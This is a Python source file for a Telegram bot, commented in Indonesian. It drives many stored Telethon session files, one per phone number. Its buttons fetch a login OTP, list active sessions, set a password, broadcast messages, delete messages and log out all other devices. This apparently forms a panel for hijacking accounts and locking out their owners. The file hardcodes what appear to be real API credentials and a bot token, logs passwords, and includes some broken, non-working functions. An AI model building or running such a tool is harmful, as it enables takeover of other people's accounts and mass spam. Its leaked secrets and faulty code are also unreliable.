import asyncio
from asyncio.log import logger
import hashlib
import math
import os
import types
from warnings import filterwarnings
from telegram.warnings import PTBUserWarning
from unittest.mock import _patch
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, CallbackContext
from telegram.ext import MessageHandler, ConversationHandler, filters
from conversation_states import SET_PASSWORD
from get_otp import get_otp_handler
from sesi_aktif import sesi_aktif_handler
from data_kontak import data_kontak_handler
from hapus_pesan import hapus_pesan_handler
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.types import User
import pytz
from datetime import datetime
import time
from set_password_handler import receive_confirmation, start_set_password, cancel_password, SET_PASSWORD
from logout_device import logout_other_devices
from configparser import ConfigParser
from telegram.helpers import escape_markdown
from broadcast import broadcast_via_dialog_handler

# Konfigurasi bot
API_ID = 23520639
API_HASH = 'bcbc7a22cde8fa2ba7d1baad086086ca'
BOT_TOKEN = '8033198485:AAG5-a8uZ3AhjRNNIUqmR4VkePTQd7j7ibA'
SESSION_FOLDER = os.path.join(os.path.dirname(__file__), '..', 'broadcast')
SESSION_FOLDER = os.path.abspath(SESSION_FOLDER)
os.makedirs(SESSION_FOLDER, exist_ok=True)

SET_PASSWORD = range(1)

# Fungsi ambil session
def get_registered_sessions():
    sessions = [f.replace('.session', '') for f in os.listdir(SESSION_FOLDER) if f.endswith('.session')]
    return sorted(sessions)

# Kirim daftar nomor dengan tombol halaman berupa angka
async def send_session_list(update: Update, context: ContextTypes.DEFAULT_TYPE, page: int = 0):
    sessions = get_registered_sessions()
    per_page = 10
    total_pages = math.ceil(len(sessions) / per_page)
    start = page * per_page
    end = start + per_page
    current_page_sessions = sessions[start:end]

    # Tombol untuk session
    keyboard = [[InlineKeyboardButton(num, callback_data=f"select_{num}")] for num in current_page_sessions]

    # Tombol angka untuk navigasi halaman
    page_buttons = []
    for p in range(total_pages):
        text = f"[{p+1}]" if p == page else str(p+1)
        page_buttons.append(InlineKeyboardButton(text, callback_data=f"page_{p}"))
    
    # Gabungkan ke keyboard
    keyboard.append(page_buttons)

    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text("📱 Pilih nomor:", reply_markup=reply_markup)
    else:
        await update.message.reply_text("📱 Pilih nomor:", reply_markup=reply_markup)

# Command /user
async def user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_session_list(update, context, 0)

# Tampilkan info akun + tombol aksi
async def handle_select_number(update, context, phone_number):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")

    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(f"❌ Session tidak ditemukan untuk {phone_number}")
        return

    try:
        # Buat client sementara
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.start()
        me = await client.get_me()
        await client.disconnect()

        # Escape data sensitif untuk MarkdownV2
        full_name = escape_markdown(f"{me.first_name or ''} {me.last_name or ''}".strip() or 'Tidak ada nama lengkap', version=2)
        username = escape_markdown(me.username or 'Tidak ada username', version=2)
        bio = escape_markdown(me.bot and 'Bot Telegram' or (me.phone or 'Tidak ada bio'), version=2)
        location = escape_markdown(me.lang_code.upper() if me.lang_code else 'Tidak diketahui', version=2)
        escaped_phone = escape_markdown(phone_number, version=2)

        from datetime import datetime
        import pytz
        local_time = datetime.now(pytz.timezone('Asia/Jakarta')).strftime('%Y-%m-%d %H:%M:%S')
        escaped_time = escape_markdown(local_time, version=2)

        info = f"👤 *Info Akun*\n\n"
        info += f"🔹 *Nama*: {full_name}\n"
        info += f"🔹 *Username*: @{username}\n"
        info += f"🔹 *Bio*: {bio}\n"
        info += f"🔹 *Lokasi*: {location}\n"
        info += f"🕒 *Waktu*: {escaped_time} WIB\n\n"
        info += f"📱 Nomor: `{escaped_phone}`\n\nPilih aksi di bawah:"

    except Exception as e:
        escaped_error = escape_markdown(str(e), version=2)
        info = f"⚠️ Gagal mengambil info akun `{escaped_phone}`:\n`{escaped_error}`"
        await update.callback_query.message.reply_text(info, parse_mode='MarkdownV2')
        return

    keyboard = [
        [
            InlineKeyboardButton("🔐 GET OTP", callback_data=f"getotp_{phone_number}"),
            InlineKeyboardButton("🟢 SESI AKTIF", callback_data=f"sesi_{phone_number}")
        ],
        [
            InlineKeyboardButton("🔒 SET PASSWORD", callback_data=f"set_password_{phone_number}"),
            InlineKeyboardButton("📢 BROADCAST", callback_data=f"broadcast_{phone_number}")
        ],
        [
            InlineKeyboardButton("❌LOGOUT DEVICE", callback_data=f"logout_{phone_number}"),
            InlineKeyboardButton("🧹 HAPUS PESAN", callback_data=f"hapuspesan_{phone_number}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.callback_query.message.reply_text(
        info,
        parse_mode='MarkdownV2',
        reply_markup=reply_markup
    )

async def handle_logout_device(update, context, phone_number):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")

    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(f"❌ Session tidak ditemukan untuk {phone_number}")
        return

    try:
        await logout_other_devices(session_path)
        await update.callback_query.message.reply_text(f"🔴 Semua perangkat selain perangkat utama telah logout.")

    except Exception as e:
        await update.callback_query.message.reply_text(f"⚠️ Gagal logout perangkat: {e}")

# Fungsi untuk menghentikan broadcast
async def stop_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.message.reply_text("❌ Broadcast dihentikan.")
    # Dapatkan context dan lakukan pembatalan broadcast jika diperlukan

# Tambahkan ConversationHandler untuk set password
set_password_conv = ConversationHandler(
    entry_points=[CommandHandler('set_password', start_set_password)],
    states={
        SET_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_confirmation)],
    },
    fallbacks=[],
)


# Handler utama tombol
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data

    if data.startswith("page_"):
        page = int(data.split("_")[1])
        await send_session_list(update, context, page)

    elif data.startswith("select_"):
        phone_number = data.split("_", 1)[1]
        await handle_select_number(update, context, phone_number)

    elif data.startswith("getotp_"):
        phone_number = data.split("_", 1)[1]
        await get_otp_handler(update, context, phone_number)

    elif data.startswith("hapuspesan_"):
        phone_number = data.split("_", 1)[1]
        await hapus_pesan_handler(update, context, phone_number)

    elif data.startswith("broadcast_"):
        phone_number = data.split("_", 1)[1]
        await broadcast_via_dialog_handler(update, context, phone_number)

    elif data.startswith("sesi_"):
        phone_number = data.split("_", 1)[1]
        await sesi_aktif_handler(update, context, phone_number)

    elif data.startswith("set_password_"):
        phone_number = data.replace("set_password_", "")
        session_path = f"login1/{phone_number}.session"
        context.user_data['session_path'] = session_path
        context.user_data['phone_number'] = phone_number
        await start_set_password(update, context)

    elif data.startswith("logout_"):
        phone_number = data.split("_", 1)[1]
        await handle_logout_device(update, context, phone_number)

    elif data == "stop_broadcast":
        await stop_broadcast(update, context)


def set_password(update, context):
    # Fungsi untuk memulai pengaturan password
    update.message.reply_text("Masukkan password baru:")
    set_password_handler = CommandHandler('set_password', set_password)
    _patch.add_handler(set_password_handler)

def handle_password_input(update, context):
    password = update.message.text
    # Log untuk melihat apakah password diterima
    logger.debug(f"Password yang diterima: {password}")

    # Proses update password Telegram
    # Lakukan update password jika input sudah sesuai
    if password:  # Validasi jika password tidak kosong
        update_password(update, context, password) # type: ignore

    password_handler = MessageHandler(filters.text & ~filters.command, handle_password_input)
    _patch.add_handler(password_handler)


set_password_conv = ConversationHandler(
    entry_points=[CommandHandler('set_password', start_set_password)],
    states={
        SET_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_confirmation)],
    },
    fallbacks=[]
)

# Fungsi utama untuk menjalankan bot
def main():
    
    application = Application.builder().token(BOT_TOKEN).build()

    # ✅ Load API ID dan HASH dari config / environment / hardcoded
    api_id = 23520639  # ganti dengan API ID kamu
    api_hash = "bcbc7a22cde8fa2ba7d1baad086086ca"  # ganti dengan API Hash kamu

    # Simpan ke context.bot_data
    application.bot_data['api_id'] = api_id
    application.bot_data['api_hash'] = api_hash

    application.add_handler(CommandHandler("user", user_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(CallbackQueryHandler(hapus_pesan_handler, pattern=r"hapus_pesan_(\d+)"))
    application.add_handler(CallbackQueryHandler(broadcast_via_dialog_handler, pattern=r"^broadcast_"))
    application.add_handler(MessageHandler(filters.TEXT & filters.REPLY, receive_confirmation))
    application.add_handler(set_password_conv)
    application.add_handler(CallbackQueryHandler(start_set_password, pattern=r"^set_password_"))

    print("✅ Bot aktif dan berjalan...")
    application.run_polling()

if __name__ == "__main__":
    main()
